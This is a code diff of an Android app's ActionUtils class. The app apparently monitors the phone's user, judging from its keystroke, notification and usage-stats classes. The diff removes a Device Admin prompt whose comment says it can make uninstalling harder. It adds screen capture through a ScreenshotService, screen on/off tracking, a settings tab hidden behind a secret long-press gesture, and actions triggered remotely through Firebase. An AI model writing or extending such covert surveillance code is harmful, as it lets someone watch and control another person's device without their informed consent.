@@ -2,31 +2,20 @@ package com.vikasyadavnsit.cdc.utils;
 
 import static android.app.Activity.RESULT_OK;
 import static android.content.Context.ALARM_SERVICE;
-import static com.vikasyadavnsit.cdc.constants.AppConstants.ENABLE_ADMIN_REQUEST_CODE;
 import static com.vikasyadavnsit.cdc.constants.AppConstants.MEDIA_PROJECTION_REQUEST_CODE;
-import static com.vikasyadavnsit.cdc.services.AppUsageStats.hasUsageStatsPermission;
-import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;
-import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getMessageText;
-import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getShayariData;
 
 import android.app.Activity;
 import android.app.AlarmManager;
-import android.app.admin.DevicePolicyManager;
-import android.bluetooth.BluetoothAdapter;
-import android.bluetooth.BluetoothDevice;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.location.LocationManager;
 import android.media.projection.MediaProjectionManager;
-import android.net.ConnectivityManager;
 import android.os.Build;
 import android.os.CountDownTimer;
+import android.os.Environment;
 import android.os.Handler;
-import android.os.PowerManager;
 import android.provider.Settings;
-import android.text.TextUtils;
+import android.util.Log;
 import android.view.MotionEvent;
 import android.view.View;
 import android.widget.Toast;
@@ -36,30 +25,16 @@ import androidx.appcompat.app.AppCompatActivity;
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
 import com.vikasyadavnsit.cdc.R;
-import com.vikasyadavnsit.cdc.constants.AppConstants;
-import com.vikasyadavnsit.cdc.data.AppUsageReportData;
-import com.vikasyadavnsit.cdc.data.KeyStrokeData;
-import com.vikasyadavnsit.cdc.data.NotificationData;
 import com.vikasyadavnsit.cdc.data.User;
 import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
-import com.vikasyadavnsit.cdc.fragment.AccessibilityNotificationFragment;
-import com.vikasyadavnsit.cdc.fragment.ClickActionsFragment;
 import com.vikasyadavnsit.cdc.fragment.HomeFragment;
-import com.vikasyadavnsit.cdc.fragment.KeyStrokesFragment;
-import com.vikasyadavnsit.cdc.fragment.MessageFragment;
+import com.vikasyadavnsit.cdc.fragment.PlayFragment;
 import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
-import com.vikasyadavnsit.cdc.fragment.SystemAppUsageStatisticsFragment;
-import com.vikasyadavnsit.cdc.receiver.DeviceAdminReceiver;
 import com.vikasyadavnsit.cdc.receiver.StatisticsBroadcastReceiver;
 import com.vikasyadavnsit.cdc.services.ScreenshotService;
 
 import java.lang.reflect.Type;
-import java.time.LocalDate;
-import java.time.format.DateTimeFormatter;
-import java.util.Comparator;
 import java.util.Map;
-import java.util.Objects;
-import java.util.TreeMap;
 
 public class ActionUtils {
 
@@ -70,21 +45,15 @@ public class ActionUtils {
     private static CountDownTimer countDownTimer;
     private static Activity context;
 
-    /**
-     * Wires up the main navigation buttons and hidden-gesture behavior for the app's primary UI.
-     *
-     * <p>This sets click listeners to navigate between {@link HomeFragment}, {@link MessageFragment},
-     * and {@link SettingsFragment}. It also attaches a touch listener to the Home button that
-     * implements a long-press-based unlock gesture for the Settings tab.</p>
-     *
-     * @param activity The hosting {@link AppCompatActivity} whose views will be bound.
-     */
     public static void handleButtonPress(AppCompatActivity activity) {
         context = activity;
 
         //Handle Button Presses
         activity.findViewById(R.id.main_navigation_request_play_button).setOnClickListener(view -> {
-            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new MessageFragment());
+            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new PlayFragment());
+
+            // Todo : databaseutil will configure a reset functionality
+
             //CDCFileReader.readAndCreateTemporaryFile(FileMap.KEYSTROKE);
         });
 
@@ -119,84 +88,103 @@ public class ActionUtils {
         });
     }
 
-    /**
-     * Central handler for activity results that need to be routed to utility flows.
-     *
-     * <p>Currently this is primarily used to capture MediaProjection consent results and start
-     * {@link ScreenshotService} when the user grants screen-capture permission.</p>
-     *
-     * @param activity    The activity receiving the result.
-     * @param requestCode Request code passed to {@code onActivityResult}.
-     * @param resultCode  Result code passed to {@code onActivityResult}.
-     * @param data        Intent data passed to {@code onActivityResult}.
-     */
     public static void onActivityResult(Activity activity, int requestCode, int resultCode, Intent data) {
         LoggerUtils.d("CommonUtil", "onActivityResult : requestCode : " + requestCode + " resultCode : " + resultCode);
         createMediaProjectionScreenshotServiceIntent(activity, requestCode, resultCode, data);
     }
 
-    /**
-     * Prompts the user to grant Device Admin privileges to the app, if not already granted.
-     *
-     * <p>This launches {@link DevicePolicyManager#ACTION_ADD_DEVICE_ADMIN} targeting
-     * {@link DeviceAdminReceiver}. Device admin may be used to make uninstall harder or enforce
-     * device policies (depending on implementation).</p>
-     *
-     * @param activity The current {@link Activity} used to start the device admin intent.
-     */
-    public static void takeDeviceAdminPermission(Activity activity) {
-        // Initialize DevicePolicyManager and the component name for the DeviceAdminReceiver
-        DevicePolicyManager mDevicePolicyManager = (DevicePolicyManager) activity.getSystemService(Context.DEVICE_POLICY_SERVICE);
-        ComponentName mAdminComponent = new ComponentName(activity, DeviceAdminReceiver.class);
+    public static void registerPhoneStatistics(Activity activity) {
+        IntentFilter filter = new IntentFilter();
+        filter.addAction(Intent.ACTION_SCREEN_OFF);
+        filter.addAction(Intent.ACTION_SCREEN_ON);
+        filter.addAction(Intent.ACTION_USER_PRESENT);
+        activity.registerReceiver(new StatisticsBroadcastReceiver(), filter);
+    }
 
-        // Check if the app is already a device admin
-        if (!mDevicePolicyManager.isAdminActive(mAdminComponent)) {
-            // Prompt the user to enable device admin
-            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminComponent);
-            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "The permission is required to help you to use CDC in the best way possible.");
-            activity.startActivityForResult(intent, ENABLE_ADMIN_REQUEST_CODE);
+    public static void requestExactAlarmPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
         }
     }
 
-    /**
-     * Ensures Notification Listener permission is enabled for the app, prompting the user if needed.
-     *
-     * <p>If not enabled, opens {@link Settings#ACTION_NOTIFICATION_LISTENER_SETTINGS}. If already
-     * enabled, it logs a message and returns.</p>
-     *
-     * @param activity Activity used to open system settings and read secure settings.
-     */
-    public static void checkOrGetNotificationListenerPermission(Activity activity) {
-        if (!isNotificationListenerEnabled(activity)) {
-            // If the notification listener permission is not enabled, prompt the user to enable it
-            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
-            activity.startActivity(intent);
-        } else {
-            // Permission is already granted, no need to prompt the user
-            LoggerUtils.d("NotificationListener", "Notification listener permission is already granted.");
+    public static boolean canScheduleExactAlarms() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            AlarmManager alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);
+            return alarmManager.canScheduleExactAlarms();
         }
+        return true; // For older versions, exact alarms are always allowed
     }
 
-    /**
-     * Checks whether this app is listed in the system's enabled notification listeners.
-     *
-     * @param activity Activity used to read secure settings and determine the current package name.
-     * @return {@code true} if the app is enabled as a notification listener; {@code false} otherwise.
-     */
-    private static boolean isNotificationListenerEnabled(Activity activity) {
-        String packageName = activity.getPackageName();
-        final String flat = Settings.Secure.getString(activity.getContentResolver(), "enabled_notification_listeners");
-        if (!TextUtils.isEmpty(flat)) {
-            final String[] names = flat.split(":");
-            for (String name : names) {
-                final ComponentName componentName = ComponentName.unflattenFromString(name);
-                if (componentName != null && TextUtils.equals(packageName, componentName.getPackageName())) {
-                    return true;
-                }
+    public static void startMediaProjectionService(Activity activity) {
+        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE);
+    }
+
+    private static void createMediaProjectionScreenshotServiceIntent(Activity activity, int requestCode, int resultCode, Intent data) {
+        if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
+            if (resultCode == RESULT_OK && data != null) {
+                Intent serviceIntent = new Intent(activity, ScreenshotService.class);
+                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode);
+                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_DATA, data);
+                activity.startService(serviceIntent);
             }
         }
-        return false;
+    }
+
+    private static Runnable settingEnablerRunnable = () -> {
+        isLongPress = true;
+        pressCount++;
+        // Check if the pressCount reaches 3 within 30 seconds
+        if (pressCount == 3) {
+            Toast.makeText(context, "Settings Tab Enabled", Toast.LENGTH_SHORT).show();
+            context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.VISIBLE);
+        }
+
+        // If the timer is not running, start the 30-second timer
+        if (!isCounting) {
+            startCountDown();
+        }
+    };
+
+    private static void startCountDown() {
+        isCounting = true;
+        countDownTimer = new CountDownTimer(20000, 1000) { // 30 seconds countdown
+            @Override
+            public void onTick(long millisUntilFinished) {
+                // No action needed on each tick
+            }
+
+            @Override
+            public void onFinish() {
+                isCounting = false;
+                if (pressCount < 3) {
+                    context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.GONE);
+                }
+                pressCount = 0; // Reset press count after 30 seconds
+            }
+        };
+        countDownTimer.start();
+    }
+
+
+    public static void performFirebaseAction(Object obj) {
+        Type type = new TypeToken<Map<String, User.AppTriggerSettingsData>>() {
+        }.getType();
+        Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
+        Log.d("ActionUtils", "Processing Remote Firebase Actions");
+        //DatabaseUtil dbUtils = DatabaseUtil.getInstance(context);
+        appTriggerSettingsDataMap.forEach((key, value) -> {
+            if (value.isEnabled()) {
+                Log.d("ActionUtils", "Performing Remote Firebase Action for : " + key);
+                value.getClickActions().getBiConsumer().accept(context, value);
+            }
+        });
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
+            ApplicationDataRepository.updateAllRecords(appTriggerSettingsDataMap);
+        }
     }
 
 
